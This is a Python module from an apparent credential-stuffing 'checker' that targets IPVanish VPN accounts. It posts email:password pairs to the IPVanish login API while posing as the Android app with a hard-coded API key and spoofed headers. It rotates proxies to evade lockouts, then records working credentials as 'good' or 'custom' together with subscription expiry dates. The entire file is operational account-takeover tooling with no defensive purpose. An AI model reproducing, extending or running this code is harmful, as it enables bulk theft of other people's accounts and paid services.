from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import post
from uuid import uuid4
from datetime import datetime

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        data = {
            "api_key": "15cb936e6d19cd7db1d6f94b96017541",
            "client": "Android-3.4.2.4.52178b52178",
            "os": "22",
            "password": password,
            "username": email,
            "uuid": str(uuid4())
        }
        headers = {
            "Content-Type": "application/json",
            "X-Client": "ipvanish",
            "X-Client-Version": "1.2.",
            "X-Platform": "Android",
            "X-Platform-Version": "22",
            "Host": "account.ipvanish.com",
            "Connection": "Keep-Alive",
            "User-Agent": "okhttp/3.12.0",
            "Accept-Encoding": "gzip, deflate"
        }
        try:
            response = post("https://account.ipvanish.com/api/v3/login",json=data, headers=headers,proxies=proxy_set,timeout=Checker.timeout)
            if "The username or password provided is incorrect" in response.text or "failed attempts" in response.text:
                retries += 1
            elif "account_type" in response.text:
                expiry = datetime.utcfromtimestamp(response.json()["sub_end_epoch"]).strftime('%Y-%m-%d')
                expire = int(datetime.utcfromtimestamp(response.json()["sub_end_epoch"]).strftime('%Y%m%d'))
                now_time = int(datetime.now().strftime('%Y%m%d'))
                if now_time > expire:
                    Checker.custom += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("custom",email+":"+password,"Ipvanish")
                    save("Ipvanish","custom",Checker.time,email+":"+password)
                    return
                else:
                    Checker.good += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("good",email+":"+password,"Ipvanish")
                    save("Ipvanish","good",Checker.time,email+":"+password+f" | Expire: {expiry}")
                    return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return